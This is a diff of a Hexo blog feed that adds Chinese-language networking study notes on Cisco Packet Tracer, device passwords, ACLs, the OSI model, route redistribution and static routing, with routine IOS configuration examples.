@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-08-16T00:12:48.976Z</updated>
+  <updated>2019-08-25T13:23:19.490Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,457 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CPT介绍及基本配置</title>
+    <link href="http://yoursite.com/2019/09/23/CPT%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
+    <id>http://yoursite.com/2019/09/23/CPT介绍及基本配置/</id>
+    <published>2019-09-23T02:59:03.575Z</published>
+    <updated>2019-08-25T13:23:19.490Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Cisco-Packet-Tracer介绍："><a href="#Cisco-Packet-Tracer介绍：" class="headerlink" title="Cisco Packet Tracer介绍："></a>Cisco Packet Tracer介绍：</h1><p>Cisco Packet Tracer 是由Cisco公司发布的一个辅助学习工具，为学习思科网络课程的初学者去设计、配置、排除网络故障提供了网络模拟环境。用户可以在软件的图形用户界面上直接使用拖曳方法建立网络拓扑，并可提供数据包在网络中行进的详细处理过程，观察网络实时运行情况。</p><h4 id="设备及线缆："><a href="#设备及线缆：" class="headerlink" title="设备及线缆："></a>设备及线缆：</h4><p>其中含有路由器、交换机、线缆等网络设备。</p><p><strong>双绞线：</strong>直通线、交叉线、全反线</p><p><code>直通线</code>：T568B标准：白橙-橙-白绿-蓝-白蓝-绿-白棕-棕</p><p>​        两端线序：T568B-T568B</p><p><code>交叉线</code>：T568A标准：白绿-绿-白橙-蓝-白蓝-橙-白棕-棕</p><p>​        两端线序：T568B-T568A</p><p><code>全反线</code>：Console线，即串口线</p><p>​        两端线序：T568B（12345678-87654321）</p><p><strong>设备之间连线规则：</strong><code>同交异直</code>（同种设备交叉线、不同设备直通线）</p><p><strong>注：</strong><code>路由器和PC属于同种设备！！！</code></p><hr><h4 id="设备开机过程："><a href="#设备开机过程：" class="headerlink" title="设备开机过程："></a>设备开机过程：</h4><p>加电自检→从flash查找和装载IOS→从NVROM里加载启动配置文件→是否进入配置向导→直接进入配置模式</p><p><strong>特殊配置文件：</strong></p><p>startup-config（启动配置文件）  </p><p>running-config（运行配置文件）</p><hr><h4 id="基本命令操作："><a href="#基本命令操作：" class="headerlink" title="基本命令操作："></a>基本命令操作：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router&gt;//用户模式</span><br><span class="line">Router#//特权模式（在用户模式输入enable）</span><br><span class="line">Router(config)#//全局模式（在特权模式输入conf t）</span><br><span class="line">Router(config)#hostname R1//配置路由器名称</span><br><span class="line">R1(config)#interface FastEthernet 0/0//进入接口</span><br><span class="line">R1(config-if)#//接口模式</span><br><span class="line">R1(config-if)#ip address 192.168.1.1 255.255.255.0 //配置IP</span><br><span class="line">R1(config-if)#no shutdown //开启端口</span><br><span class="line">R1(config-if)#exit//退出当前模式，返回上一级模式</span><br><span class="line">R1(config-if)#end//返回特权模式</span><br><span class="line">R1#reload//重启设备</span><br></pre></td></tr></table></figure><p><strong>要点：</strong></p><p>​    ⚫命令支持简写，如enable可以简写为en</p><p>​    ⚫问号能够弹出帮助菜单</p><p>​    ⚫tab键能够补全命令，如输入en，按tab键能补全为enable</p><hr><h1 id="设备密码配置："><a href="#设备密码配置：" class="headerlink" title="设备密码配置："></a>设备密码配置：</h1><h4 id="使能加密密码："><a href="#使能加密密码：" class="headerlink" title="使能加密密码："></a>使能加密密码：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#enable password 123456//明文密码</span><br><span class="line">R1(config)#enable secret 123456//密文密码</span><br></pre></td></tr></table></figure><p><code>当明文和密文同时配置时，加密的密码优先生效</code></p><h4 id="保存配置文件："><a href="#保存配置文件：" class="headerlink" title="保存配置文件："></a>保存配置文件：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#copy running-config startup-config</span><br><span class="line">R1#write</span><br></pre></td></tr></table></figure><p><code>两种方式均可</code></p><h4 id="查看详细配置："><a href="#查看详细配置：" class="headerlink" title="查看详细配置："></a>查看详细配置：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#show ip interface brief//查看接口摘要信息</span><br><span class="line">R1#show running-config//查看当前的运行配置文件</span><br><span class="line">R1#show startup-config//查看启动配置文件</span><br></pre></td></tr></table></figure><p>……</p><hr><h1 id="设备管理："><a href="#设备管理：" class="headerlink" title="设备管理："></a>设备管理：</h1><h4 id="远程登录："><a href="#远程登录：" class="headerlink" title="远程登录："></a>远程登录：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int vlan 1</span><br><span class="line">Switch(config-if)#ip add 1.1.1.1 255.255.255.0//配置管理地址</span><br><span class="line">Switch(config-if)#no shut//启用接口</span><br><span class="line">Switch(config)#line vty 0 4//进入VTY端口</span><br><span class="line">Switch(config-line)#password 123//设置登录密码</span><br><span class="line">Switch(config-line)#login//允许登录</span><br></pre></td></tr></table></figure><p><code>vty后的0 4表示同时允许5个终端连接，最多为0 15</code></p><h4 id="控制台登录："><a href="#控制台登录：" class="headerlink" title="控制台登录："></a>控制台登录：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#line console 0//进入console端口</span><br><span class="line">Switch(config-line)#password 123//设置登录密码</span><br><span class="line">Switch(config-line)#login//允许登录</span><br></pre></td></tr></table></figure><hr><h1 id="备份与还原："><a href="#备份与还原：" class="headerlink" title="备份与还原："></a>备份与还原：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#copy tftp: flash://通过tftp从服务器升级IOS</span><br><span class="line">Switch#show flash//查看IOS版本</span><br><span class="line">Switch#copy flash: tftp://通过tftp备份IOS到服务器</span><br><span class="line">Switch#copy runnning-config：tftp：//备份运行配置文件</span><br><span class="line">Switch#copy tftp：runnning-config：//还原运行配置文件</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Cisco-Packet-Tracer介绍：&quot;&gt;&lt;a href=&quot;#Cisco-Packet-Tracer介绍：&quot; class=&quot;headerlink&quot; title=&quot;Cisco Packet Tracer介绍：&quot;&gt;&lt;/a&gt;Cisco Packet Tracer介
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="工具使用" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ACL-访问控制列表</title>
+    <link href="http://yoursite.com/2019/09/23/ACL/"/>
+    <id>http://yoursite.com/2019/09/23/ACL/</id>
+    <published>2019-09-23T02:59:03.572Z</published>
+    <updated>2019-08-26T14:35:20.848Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="ACL（访问控制列表）："><a href="#ACL（访问控制列表）：" class="headerlink" title="ACL（访问控制列表）："></a>ACL（访问控制列表）：</h1><p>访问控制列表（ACL）是一种基于包过滤的访问控制技术，它可以根据设定的条件对接口上的数据包进行过滤，允许其通过或丢弃。访问控制列表被广泛地应用于路由器和三层交换机。借助于访问控制列表，可以有效地控制用户对网络的访问，从而最大程度地保障网络安全。</p><p>ACL的基本原理：它负责管理用户配置的所有的规则，提供报文匹配规则的算法。</p><p>ACL规则的匹配： 报文到达设备后，设备从报文中提取信息，并将提取到的报文与ACL规则进行匹配，如果有提取的信息与规则匹配成功就称作命中规则，之后就停止查找，根据匹配的规则进行相应的动作； 还有可能查找完所有的匹配规则都没有一条规则能匹配成功，这称为未命中规则。</p><p>匹配过程会有两种结果，命中规则和未命中规则，命中规则中又分为命中permit(允许)规则和命中deny(拒绝)规则。</p><h3 id="ACL分类："><a href="#ACL分类：" class="headerlink" title="ACL分类："></a>ACL分类：</h3><p><strong>标准ACL：</strong></p><p>标准ACL只检查数据包的源地址，网络管理员可以使用标准ACL阻止来自某一网络的所有通信流量，或者允许来自某一特定网络的所有通信流量，或者拒绝某一协议簇（比如IP）的所有通信流量。</p><p><code>标准ACL的列表号是1~99</code></p><p><strong>扩展ACL：</strong></p><p>扩展ACL既检查数据包的源地址，也检查数据包的目的地址，同时还可以检查数据包的特定协议类型、端口号等。扩展ACL比标准ACL提供了更广泛的控制范围。例如，网络管理员如果希望做到“允许外来的Web通信流量通过，拒绝外来的FTP和Telnet等通信流量”，那么，他可以使用扩展ACL来达到目的，标准ACL不能控制这么精确。</p><p><code>扩展ACL的列表号是100~199</code></p><p><strong>命名ACL：</strong></p><p>命名访问控制列表允许在标准和扩展访问控制列表中使用名称代替表号。</p><hr><h1 id="ACL的配置："><a href="#ACL的配置：" class="headerlink" title="ACL的配置："></a>ACL的配置：</h1><h3 id="标准ACL的创建："><a href="#标准ACL的创建：" class="headerlink" title="标准ACL的创建："></a>标准ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 1 permit 192.168.1.10 0.0.0.255//允许网络192.168.1.10</span><br><span class="line">R1(config)#access-list 1 deny 192.168.1.10 0.0.0.255//拒绝网络192.168.1.10</span><br><span class="line">R1(config)#access-list 1 permit any//允许其他所有</span><br><span class="line">R1(config)#no access-list 1 deny 192.168.1.10 0.0.0.255//删除访问控制列表</span><br><span class="line">R1(config)#interface f0/1//进入接口</span><br><span class="line">R1(config-if)#ip accss-group 1 in/out//应用到端口</span><br><span class="line">R1(config-if)#no ip accss-group 1 in/out//取消应用到端口</span><br><span class="line">R1(config-if)#show access-list//查看访问控制列表</span><br></pre></td></tr></table></figure><p><strong>通配符掩码：</strong>也叫做反码。用二进制数0和1表示，如果某位为1，表明这一位不需要进行匹配操作，如果为0表明需要严格匹配。</p><p>隐含拒绝语句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 1 deny 0.0.0.0  255.255.255.255</span><br></pre></td></tr></table></figure><hr><h3 id="扩展ACL的创建："><a href="#扩展ACL的创建：" class="headerlink" title="扩展ACL的创建："></a>扩展ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255</span><br><span class="line">//允许网络192.168.1.10访问192.168.2.0的所有服务</span><br><span class="line">R1(config)#access-list 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21</span><br><span class="line">//拒绝192.168.1.0网段访问192.168.2.2的TCP的21端口</span><br><span class="line">R1(config)#access-list 101 permit ip any any//允许其他所有</span><br><span class="line">R1(config)#access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echo</span><br><span class="line">//拒绝192.168.1.0网络ping主机192.168.2.2</span><br><span class="line">R1(config-if)#ip accss-group 101 in/out//应用到端口</span><br></pre></td></tr></table></figure><hr><h3 id="命名ACL的创建："><a href="#命名ACL的创建：" class="headerlink" title="命名ACL的创建："></a>命名ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list standard list1//创建名为list1的标准ACL</span><br><span class="line">R1(config)#access-list extended list2//创建名为list2的扩展ACL</span><br><span class="line">R1(config-list)#permit host 192.168.1.1//允许网络</span><br><span class="line">R1(config-list)#deny any//拒绝所有</span><br><span class="line">R1(config-if)#ip accss-group list1 in/out//应用到端口</span><br></pre></td></tr></table></figure><hr><h1 id="基于时间的ACL："><a href="#基于时间的ACL：" class="headerlink" title="基于时间的ACL："></a>基于时间的ACL：</h1><p>当有些时候需要在一定时间段让ACL生效时，可以使用基于时间的ACL来实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#time-range  time1//创建一个名为time1的时间区间</span><br><span class="line">R1(config-range)#absolute start 0:00 1 oct 2019 end 0:00 8 oct 2019//建立一个时间区间范围</span><br><span class="line">R1(config-range)#periodic daily 9:00 to 17:00//建立一个周期时间范围</span><br><span class="line">R1(config-range)#periodic Thursday 9:00 to friday 17:00//建立一个周期时间范围</span><br><span class="line">R1(config)# access-list 101 deny tcp any host 192.168.1.254 eq 20 time-range time1</span><br><span class="line">//应用到ACL</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;ACL（访问控制列表）：&quot;&gt;&lt;a href=&quot;#ACL（访问控制列表）：&quot; class=&quot;headerlink&quot; title=&quot;ACL（访问控制列表）：&quot;&gt;&lt;/a&gt;ACL（访问控制列表）：&lt;/h1&gt;&lt;p&gt;访问控制列表（ACL）是一种基于包过滤的访问控制技术，它可以
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络层次结构</title>
+    <link href="http://yoursite.com/2019/09/23/%E7%BD%91%E7%BB%9C%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"/>
+    <id>http://yoursite.com/2019/09/23/网络层次结构/</id>
+    <published>2019-09-23T02:59:03.570Z</published>
+    <updated>2019-08-26T14:38:12.288Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="OSI七层模型："><a href="#OSI七层模型：" class="headerlink" title="OSI七层模型："></a>OSI七层模型：</h1><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><p>OSI（Open System Interconnection）,即开放系统互连，它是一种网络的参考模型，主要分为七层。</p><h4 id="基本层次："><a href="#基本层次：" class="headerlink" title="基本层次："></a>基本层次：</h4><h5 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h5><p>提供用户界面；文件、打印、消息、数据库和应用程序服务。它是用户与计算机交流的场所，仅当马上需要访问网络时，这一层才会发挥作用，是实际应用程序之间的接口，如FTP、TFTP等。</p><h5 id="表示层："><a href="#表示层：" class="headerlink" title="表示层："></a>表示层：</h5><p>表示数据进行加密等处理；数据加密、压缩和转换服务。它向应用层提供数据，并负责数据转换和代码格式化，OSI制定了相关的协议标准，这些标准定义了如何格式化标准数据。诸如数据压缩、解压缩、加密和解密等任务都与表示层有关。有些表示层标准还涉及多媒体操作。</p><h5 id="会话层："><a href="#会话层：" class="headerlink" title="会话层："></a>会话层：</h5><p>将不同应用程序的数据分离；对话控制。它负责在表示层实体之间建立、管理和终止会话，还对设备或节点之间的对话进行控制。它协调和组织系统之间的通信，为此提供了3种不同的模式：单工、半双工和全双工。总之，会话层的基本功能是将不同应用程序的数据分离。</p><h5 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h5><p>提供可靠或者不可靠的传输，在重传前执行纠错；端到端连接。它将数据进行分段并重组为数据流。位于传输层的服务将来自上层应用的数据进行分段和重组，并将它们合并到同一个数据流中。他们提供了端到端的数据传输服务，并可在互联网络上的发送主机和目标主机之间建立逻辑连接。</p><h5 id="网络层："><a href="#网络层：" class="headerlink" title="网络层："></a>网络层：</h5><p>提供逻辑地址，路由器使用它们来选择路径；路由选择。它管理设备编址、跟踪设备在网络中的位置并确定最佳的数据传输路径，网络层必须在位于不同网络中的设备之间传输数据流，路由器位于网络层，在互联网络中提供路由选择服务。</p><h5 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h5><p>将分组拆分为字节，并将字节组合成帧，使用MAC地址提供介质访问，执行错误检测，但不会纠错；成帧。IEEE以太网数据链路层包含两个子层。</p><h6 id="介质访问控制（MAC）子层（802-3）"><a href="#介质访问控制（MAC）子层（802-3）" class="headerlink" title="介质访问控制（MAC）子层（802.3）:"></a>介质访问控制（MAC）子层（802.3）:</h6><p>它定义了如何通过介质传输分组。它采用”先到先服务”的访问方式，带宽由大家共享，因此称为竟用介质访问( contention media access )。 这个子层定义了物理地址和逻辑拓扑。什么是逻辑拓扑呢?它指的是信号在物理拓扑中的传输路径。在这个子层，还可使用线路控制、错误通知(不会纠错)、顺序传递帧以及可选的流量控制。</p><h6 id="逻辑链路控制（LLC）子层（802-2）："><a href="#逻辑链路控制（LLC）子层（802-2）：" class="headerlink" title="逻辑链路控制（LLC）子层（802.2）："></a>逻辑链路控制（LLC）子层（802.2）：</h6><p>负责识别网络层协议并对其进行封装。 LLC 报头告诉数据链路层收到帧后如何对分组进行处理。其工作原理类似于：收到帧后，主机查看 LLC报头以确定要将分组交给谁，如网络层的 IP 协议 LLC 还可提供流量控制以及控制比特排序。</p><h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>在设备之间传输比特、指定电平、电缆速度和电缆针脚；物理拓扑，主要发送和接收比特数据。</p><h1 id="数据的封装与解封装："><a href="#数据的封装与解封装：" class="headerlink" title="数据的封装与解封装："></a>数据的封装与解封装：</h1><h4 id="封装与解封装过程："><a href="#封装与解封装过程：" class="headerlink" title="封装与解封装过程："></a>封装与解封装过程：</h4><p>(1) 用户信息被转换为数据，以便通过网络进行传输。 </p><p>(2) 数据被转换为数据段，发送主机和接收主机之间建立一条可靠的连接。 </p><p>(3) 数据段被转换为分组或数据报，逻辑地址被添加在报头中，以便能够在互联网络中路由分组。</p><p>(4) 分组或数据报被转换为帧，以便在本地网络中传输。硬件(以太网)地址被用于唯一标识本地网段中的主机。 </p><p>(5) 帧被转换为比特，并使用数字编码方法和时钟同步方案。</p><h4 id="不同层次传输数据类型："><a href="#不同层次传输数据类型：" class="headerlink" title="不同层次传输数据类型："></a>不同层次传输数据类型：</h4><p>传输层：数据以<strong>数据段</strong>的形式传输</p><p>网络层：数据以<strong>分组</strong>的形式传输</p><p>数据链路层：数据以<strong>帧</strong>的形式传输</p><p>物理层：数据以比<strong>特</strong>的形式传输</p><h1 id="TCP-IP与DOD模型"><a href="#TCP-IP与DOD模型" class="headerlink" title="TCP/IP与DOD模型:"></a>TCP/IP与DOD模型:</h1><h4 id="DoD模型与OSI模型的对应关系"><a href="#DoD模型与OSI模型的对应关系" class="headerlink" title="DoD模型与OSI模型的对应关系:"></a>DoD模型与OSI模型的对应关系:</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60lwzbs54j30al07ot8l.jpg" alt></p><h4 id="不同层次的协议："><a href="#不同层次的协议：" class="headerlink" title="不同层次的协议："></a>不同层次的协议：</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60ly1ifryj30g609u0sr.jpg" alt></p><h4 id="常用协议："><a href="#常用协议：" class="headerlink" title="常用协议："></a>常用协议：</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60lyo1zhpj30l7088t8x.jpg" alt></p><hr><h4 id="TCP："><a href="#TCP：" class="headerlink" title="TCP："></a>TCP：</h4><p>传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。</p><h5 id="TCP三次握手："><a href="#TCP三次握手：" class="headerlink" title="TCP三次握手："></a>TCP三次握手：</h5><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6dgi2myiij30el08pweg.jpg" alt></p><h6 id="第一次握手："><a href="#第一次握手：" class="headerlink" title="第一次握手："></a>第一次握手：</h6><p>建立连接时，客户端会发送SYN（同步序列编号）包（syn=j）到服务端，并进入SYN_SEND（发送）状态，等待服务端确认。</p><h6 id="第二次握手："><a href="#第二次握手：" class="headerlink" title="第二次握手："></a>第二次握手：</h6><p>服务器收到SYN包，确认客户端的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态。</p><h6 id="第三次握手："><a href="#第三次握手：" class="headerlink" title="第三次握手："></a>第三次握手：</h6><p>客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK（ack=k+1），此包发送完毕，客户端和服务端进入ESTABLISHED（连接）状态，完成三次握手。</p><p><strong>使用TCP的协议：</strong>FTP、Telnet、SMTP、HTTP、POP3</p><hr><h4 id="UDP："><a href="#UDP：" class="headerlink" title="UDP："></a>UDP：</h4><p>internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法，此连接方式并不可靠。</p><p><strong>常用的UDP端口号：</strong>53（DNS）、69（TFTP）、161（SNMP）</p><p><strong>使用UDP的协议：</strong>TFTP、SNMP、NFS、DNS、BOOTP</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;OSI七层模型：&quot;&gt;&lt;a href=&quot;#OSI七层模型：&quot; class=&quot;headerlink&quot; title=&quot;OSI七层模型：&quot;&gt;&lt;/a&gt;OSI七层模型：&lt;/h1&gt;&lt;h4 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; ti
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>路由重分布</title>
+    <link href="http://yoursite.com/2019/09/23/%E8%B7%AF%E7%94%B1%E9%87%8D%E5%88%86%E5%B8%83/"/>
+    <id>http://yoursite.com/2019/09/23/路由重分布/</id>
+    <published>2019-09-23T02:59:03.568Z</published>
+    <updated>2019-09-17T03:21:54.374Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="路由重分布："><a href="#路由重分布：" class="headerlink" title="路由重分布："></a>路由重分布：</h1><p>路由重分布为在同一个互连网络中高效地支持多种路由协议提供了可能，执行路由重分布的路由器被称为边界路由器，因为它们位于两个或多个自治系统的边界上。</p><p>路由重分布时度量标准和管理距离是必须要考虑的，在进行行重分布时必须转换试题标准，使得它们兼容。种子度量值（Seed Metric)是在路由生分布时定义的，它是一条通过外部重分布进来的路由的初始度量值。路由协议默认的种子度量值如下表：</p><table><thead><tr><th>路由协议</th><th>默认种子度量值</th></tr></thead><tbody><tr><td>RIP</td><td>无限大</td></tr><tr><td>EIGRP</td><td>无限大</td></tr><tr><td>OSPF</td><td>20，BGP为1</td></tr><tr><td>IS-IS</td><td>0</td></tr><tr><td>BGP</td><td>IGP的度量值</td></tr></tbody></table><p>考虑的问题：</p><p>1、路由反馈：双向重分布有可能把从一个自治系统学到的路由信息发送回该自治系统。</p><p>2、路由信息的兼容：不同路由协议的度量标准是不同的</p><p>3、收敛时间不一致</p><h1 id="路径控制概述："><a href="#路径控制概述：" class="headerlink" title="路径控制概述："></a>路径控制概述：</h1><p>为了保证网络的高效运行及在路由重分布的时候避免次优路由或者路由环路，有必要对路由更新进行控制，常用的方法有被动接口、默认路由、静态路由、路由映射表、分布列表、前缀列表、偏移列表、Cisco IOS IP服务等级协议（SLA）和策略路由。在进行路由控制时，可能是多种方法进行组合。</p><p><strong>路由映射表（Router Map）</strong></p><p>可以比做复杂的访问控制列表，主要功能包括路由控制和策略路由等。</p><p><strong>1、定义路由映射表的格式如下：</strong></p><p><strong>定义路由映射表：</strong>route-map map-tag [permit |<br>deny] [sequence-number]</p><p><strong>条件匹配：</strong></p><p>macth（常用的匹配条件包括IP地址、接口、、度量值、tag、路由类型以及数据包长度等）</p><p>如果格式为：match ip address a b c     表示逻辑或，只要有一个条件满足即可</p><p>如果格式为：match ip address a  </p><p>match ip address b  </p><p>match ip address c         表示逻辑与，必须同时满足所有条件</p><p><strong>定义行为：set</strong></p><table><thead><tr><th>Set行为</th><th>描述</th></tr></thead><tbody><tr><td>set ip next hop</td><td>设定数据包的下一跳地址</td></tr><tr><td>set interface</td><td>设定数据包出接口</td></tr><tr><td>set ip default next hop</td><td>设置默认的下一跳地址，用于当路由表里没有达到目的地址路由条目的时候</td></tr><tr><td>set ip tos</td><td>设定IP数据包的TOS值</td></tr><tr><td>set ip precedence</td><td>设定IP数据包的优先级</td></tr><tr><td>set metric</td><td>设置路由的度量值</td></tr><tr><td>set tag</td><td>设定路由的标记值</td></tr></tbody></table><p><strong>2、路由映射表有如下特征</strong></p><p>1、一个route map末尾默认行为是“deny any”</p><p>​      如执行策略路由时，没有匹配则正常转发</p><p>​      如路由重分时，没有匹配则被过滤掉</p><p>2、一个route map可以包含多个route map陈述，从上到下被执行，如route map陈述中没有math，则匹配所有。</p><p>3、序列号指定了条件执行的顺序，不写默认为10，不会自动递增</p><p>4、route map中不写permit deny默认为permit</p><p>5、在删除route map时，没写编号则删除整个route map</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;路由重分布：&quot;&gt;&lt;a href=&quot;#路由重分布：&quot; class=&quot;headerlink&quot; title=&quot;路由重分布：&quot;&gt;&lt;/a&gt;路由重分布：&lt;/h1&gt;&lt;p&gt;路由重分布为在同一个互连网络中高效地支持多种路由协议提供了可能，执行路由重分布的路由器被称为边界路由器，因为
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>路由协议介绍及静态路由</title>
+    <link href="http://yoursite.com/2019/09/23/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"/>
+    <id>http://yoursite.com/2019/09/23/路由协议介绍及静态路由/</id>
+    <published>2019-09-23T02:59:03.564Z</published>
+    <updated>2019-08-25T13:55:31.342Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="路由协议："><a href="#路由协议：" class="headerlink" title="路由协议："></a>路由协议：</h1><p>路由（routing）是指分组从源到目的地时，决定端到端路径的网络范围的进程  。路由工作在OSI参考模型第三层——网络层的数据包转发设备。路由器通过转发数据包来实现网络互连。虽然路由器可以支持多种协议（如TCP/IP、IPX/SPX、AppleTalk等协议），但是在我国绝大多数路由器运行TCP/IP协议。路由器通常连接两个或多个由IP子网或点到点协议标识的逻辑端口，至少拥有1个物理端口。路由器根据收到数据包中的网络层地址以及路由器内部维护的路由表决定输出端口以及下一跳地址，并且重写链路层数据包头实现转发数据包。路由器通过动态维护路由表来反映当前的网络拓扑，并通过网络上其他路由器交换路由和链路信息来维护路由表。</p><p>为了实现路由功能，路由器应该做到：知道目的地址、分辨源从哪里学到、发现可能路由、选择最佳路由、不停地检测与维护路由信息。</p><h3 id="路由表与路由条目："><a href="#路由表与路由条目：" class="headerlink" title="路由表与路由条目："></a>路由表与路由条目：</h3><p>直连: 路由器连接到该网络</p><p>静态路由: 由系统管理员手动输入</p><p>动态路由:通过交换路由信息获得</p><p>默认路由: 静态或动态获得; 在不知道网络的明确路由时使用</p><h3 id="自治系统："><a href="#自治系统：" class="headerlink" title="自治系统："></a>自治系统：</h3><p>自治系统是通用管理域中的网络的集合，内部网关协议在自治系统中工作，外部网关协议连接不同的自治系统。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c9ch6j32j30k906sadu.jpg" alt></p><h3 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h3><p><strong>静态路由：</strong></p><p>由网络管理员手动输入路由器命令管理，在小型网络中适合设置静态路由</p><p>配置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#ip route 172.16.3.0 255.255.255.0  192.168.1.2 / f0/1</span><br><span class="line">  目标网络    目标网络掩码    下一跳地址或自身接口</span><br></pre></td></tr></table></figure><p><strong>动态路由：</strong></p><p>动态路由协议根据拓扑或流量改变而自动调整，路由器之间使用路由协议确定到达远程网络的路径，并在路由表中维护这些网络。确定路径后，路由器可以将路由协议路由到已获知的网络。常见的动态路由协议有RIP、EIGRP、OSPF等</p><p><strong>路由协议类型：</strong></p><p>路由协议的类型有距离矢量路由协议、高级距离矢量路由协议和链路状态路由协议。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;路由协议：&quot;&gt;&lt;a href=&quot;#路由协议：&quot; class=&quot;headerlink&quot; title=&quot;路由协议：&quot;&gt;&lt;/a&gt;路由协议：&lt;/h1&gt;&lt;p&gt;路由（routing）是指分组从源到目的地时，决定端到端路径的网络范围的进程  。路由工作在OSI参考模型第三层——
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
